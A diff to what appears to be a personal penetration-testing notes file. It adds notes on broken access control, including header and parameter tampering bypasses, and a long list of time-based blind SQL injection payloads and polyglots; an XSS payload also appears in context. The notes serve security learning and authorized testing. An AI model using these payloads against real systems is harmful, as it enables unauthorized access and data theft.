@@ -60,6 +60,60 @@ Any changes - takes list of urls and regulary changes for new changes on page
 ## LEARN:   
 everything about WAF from security perspective [here](https://github.com/0xInfection/Awesome-WAF)
 
+# BAC (Broken Access Control)
+BAC - When users can act ouside intended perms  
+
+How to test for BAC:
+- Black box: 
+    - Map app (identifying all instances where app appears to be interacting with underlying os)
+    - Understand how access control is implemented for each privilege level
+    - Maniulate params that are potentially used to make ac decisions back end
+    - Automate testing using extensions (ex: Autorize)
+- White Box:
+    - Reivew code to id how acess controls are implemented in app 
+        - Violations of POLP
+        - Weak/missing access control checks on functions/resources
+        - Missint access control rules for POST, PUT, DELETE methods at the API level
+        - Relying solely on client side input to perform access control decisions
+    - Validate potential access control vulns on a running app
+
+How to exploit BAC:   
+- depends on type:
+    - Usually just a matter of manipulated of vuln field peram
+
+- Burp ext - autorize
+
+3 types:   
+- Veritcal Acess Control - restrict access to functions not available for other users in org
+    - priv ladder
+- Horizontal access control - enables different users to access similar resource types
+    - Can only access own data (if same perms)
+- Context dependent access control - restricts access to functionality and resources based on state of app/users interaction with it
+    - ex: have to confirm before delete user
+    - ex: Altering shopping cart post order
+
+Horizontal Priv Esc - when attacker gains access to resources belonging to another user  
+Vertical Priv Esc - attacker access to privileged functionality, not permitted to access    
+- Isadmin=true? --> if true gets admin
+- role=1? -> setting custom vars to gain admin perms
+- `X-Original-URL` header - bypass url based ac
+Access Control Vulns in Multi-Step Process
+    - `X-Rewrite-URL` can do same
+- /confirm -> /delete (deletes user)
+- devs commonly asume can never call /delete manually so all ac on /confirm
+Other:
+- bypasssing control chekcs by modifying params in URL or HTML page
+Accessing API with missing contorls on POST, PUT and DELETE methods
+- Manipulating metadata (JWTs or cookies)
+- Explotiing CORS misconfiguration allowing API access from unauthorized/untrusted origins
+- Force brwosing to authenticated pages -> as unauth 
+
+Terms:  
+Session Management - id's which subsequent http requests are being made by each user  
+- token/cookie (ex)
+
+Resources [link](https://www.youtube.com/watch?v=_jz5qFWhLcg&ab_channel=RanaKhalil)
+
 # XSS
 - `<img src=x onerror=alert(0)>`
 - `?"></script><base%20c%3D=href%3Dhttps:\mysite>`
@@ -300,3 +354,62 @@ Access-Control-Allow-Origin
 - Stick to what you know and don't get overwhelmed
 - recon recon recon
 
+# SQLI 
+```0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
+
+0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+
+'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
+
+X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X
+
+X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
+
+X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
+
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+
+(SELECT(0)FROM(SELECT(SLEEP(6)))a)
+
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+
+'%2b(select*from(select(sleep(5)))a)%2b'
+
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
+
+');(SELECT 4564 FROM PG_SLEEP(5))--
+
+["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
+
+DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar
+
+AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar
+
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
+
+(select*from(select(sleep(20)))a)
+
+'%2b(select*from(select(sleep(0)))a)%2b'
+
+*'XOR(if(2=2,sleep(10),0))OR'
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
+
+'+(select*from(select(if(1=1,sleep(20),false)))a)+'"
+
+2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
+
+BENCHMARK(10000000,MD5(CHAR(116)))
+
+'%2bbenchmark(10000000%2csha1(1))%2b'
+
+'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true
+
+polyglots payloads:
+
+if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/```
